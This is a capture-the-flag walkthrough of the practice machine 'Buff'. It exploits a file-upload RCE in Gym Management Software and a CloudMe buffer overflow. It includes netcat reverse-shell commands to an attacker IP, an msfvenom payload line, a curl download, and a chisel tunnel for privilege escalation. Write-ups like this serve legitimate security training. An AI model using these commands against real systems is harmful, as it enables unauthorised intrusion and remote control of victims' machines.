title: Buff - Walkthrough
---

Buff was a pretty straightforward. If you follow the path and google everything that you find, that box should be easy and fun to do !

## Recon

I start with a quick Nmap followed by a full scan with the default script (-C) and the -V tag to get more info about the services.

{% highlight sh %}
sudo nmap buff && sudo nmap -sCV -p- buff -oN nmap
{% endhighlight %}

{% highlight text %}

{% endhighlight %}

As you can see we have only 2 ports open.
Apache 2.4.43 is running on port 8080 and on port 7680 we have something called <strong><cite>Pando-pub</cite></strong>. 
The http-title is very evocative and I'm gonna keep <strong><cite>mrb3n</cite></strong> as a potential username. 

I googled pando and it seems to be a software which is used to transfer files over a network. It might be interesting to investigate that service but first, let's have a look at the website. Maybe we could get some more information from it. 

It seems to be a classic website about fitness stuff. On the contact page, I found this 
> <strong><cite> Made using Gym Management Software 1.0 </cite></strong>

I googled it and boom, we have our first [exploit](https://www.exploit-db.com/exploits/48506).

Apparently <cite>Gym Management System</cite> has a vulnerability where a remote attacker can upload a file and gain RCE from it. Here the exploit upload a fake PNG file via the `/upload.php` script on the server. 
It creates the fake image on the fly using the [magic bytes technique](https://medium.com/@d.harish008/what-is-a-magic-byte-and-how-to-exploit-1e286da1c198). If you don't know what it is, there are a lot of resources on internet who explain it. To be short, it uses the first bytes ([\x89\x50\x4e\x47\x0d\x0a\x1a](https://gchq.github.io/CyberChef/#recipe=From_Hex('%5C%5Cx')&input=XHg4OVx4NTBceDRlXHg0N1x4MGRceDBhXHgxYQ)) of a valid image file and then past a malicious code after it.


## Foothold

Anyway, all we need to do is to provide the uri of the website and Voila ! we have a basic shell. 

{% highlight sh %}
python2.7 ./exploit.py http://buff:8080/
{% endhighlight %}

{% highlight sh %}
{% endhighlight %}

{% highlight text %}
            /\

{% endhighlight %}

## User

Apparently, we are connected as a user called <strong><cite>shaun</cite></strong>. 

{% highlight text %}
dir \users\shaun\desktop
{% endhighlight %}

{% highlight text %}

{% endhighlight %}

Before starting the privesc, I'd like to have a better shell so I just uploaded netcat to the `\tmp` directory and then ran it to access my local machine on port 2222. 

{% highlight sh %}
nc 10.10.14.10 2222 -e powershell
{% endhighlight %}

## Privileges Escalation - Root

The first thing, I always do is checking my actual privileges:

{% highlight sh %}
whoami /all
{% endhighlight %}

I don't see anything interesting here so we can move on and try to enumerate Shaun's personal folders. 

There is a file inside the `Documents` folder but it's just a command to run Xampp.

{% highlight sh %}
type .\documents\tasks.bat
{% endhighlight %}

{% highlight text %}
START C:/xampp/xampp_start.exe
{% endhighlight %}

In the `Downloads` directory, I found a file called <cite><strong>CloudMe_1112.exe</strong></cite>. A quick google search to realize that this program is vulnerable to a buffer overflow [attack](https://www.exploit-db.com/exploits/48389). 

To exploit this, we need to understand what it does exactly. So, if we look at the POC, we can see that it takes a payload that has been generated using msfvenom. 
Then it connects to the target on port 8888 and injects the payload. 

All we need to do is to modify the payload because right now, it's just running the calc.exe command, which is not what we want !

So I ran msfvenom on my kali box and modified the script with my new payload. Again, I used netcat because I already uploaded it for the foothold but you can use the command that you want to get a shell. 

{% highlight text %}
msfvenom -a x86 -p windows/exec CMD='c:\tmp\nc.exe 10.10.14.10 3333 -e powershell' -b '\x00\x0A\x0D' -f python

The second problem that we have is that python is not installed on the target and we cannot run the script remotely because the port 8888 is running behind the firewall. So, we need to find a way to run a python script without python and also to bypass the firewall. To do that, I like to use [chisel](https://github.com/jpillora/chisel).

Chisel allow us to create a tunnel between the target and the local machine, so we can forward the target port 8888 to our kali box. 

On my local machine, I used the port 9999 but any other port will works fine. 
{% highlight sh %}
chisel server --port 9999 --reverse
{% endhighlight %}

Then I uploaded chisel on the target and ran it like this.
{% highlight text %}
curl http://10.10.14.10/chisel.exe -o \tmp\chisel.exe
.\chisel.exe client 10.10.14.10:9999 R:8888:127.0.0.1:8888
{% endhighlight %}

So, now any packets that we receive on port 8888 will be forwarded to the target machine. 

Set up a listener.

{% highlight sh %}
nc -lvnp 3333
{% endhighlight %}

Let's run our exploit now !

{% highlight sh %}
python root-exploit.py
{% endhighlight %}

<strong>Rooted ;)</strong>
